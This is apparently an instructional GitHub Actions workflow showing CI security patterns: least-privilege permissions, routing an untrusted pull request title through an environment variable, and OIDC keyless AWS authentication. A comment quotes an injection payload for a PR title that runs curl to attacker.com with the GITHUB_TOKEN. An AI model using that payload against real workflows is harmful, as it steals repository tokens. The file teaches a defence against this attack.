name: "09 · Security Patterns"

# Workflow-level default: read-only permissions.
# The default is broader — narrowing it reduces blast radius on fork PRs.
permissions:
  contents: read

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  run-tests:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: "20"
          cache: "npm"
      - run: npm install
      - run: npm test

  injection-safe:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      # UNSAFE: ${{ github.event.pull_request.title }} inline in run: is injectable
      # An attacker can set the title to: `"; curl attacker.com?t=$GITHUB_TOKEN; echo "`
      #
      # SAFE: route untrusted data through an env var — the shell sees it as a string
      - name: Use env var for user-controlled data
        env:
          PR_TITLE: "${{ github.event.pull_request.title || 'no PR' }}"
        run: |
          echo "PR title: $PR_TITLE"

  # OIDC: request a short-lived cloud token instead of storing a static secret.
  # Uncomment and configure role-to-assume to use with AWS.
  # oidc-keyless-auth:
  #   runs-on: ubuntu-latest
  #   permissions:
  #     contents: read
  #     id-token: write  # required to request an OIDC token
  #   steps:
  #     - uses: aws-actions/configure-aws-credentials@v4
  #       with:
  #         role-to-assume: ${{ secrets.AWS_ROLE_ARN }}
  #         aws-region: us-east-1
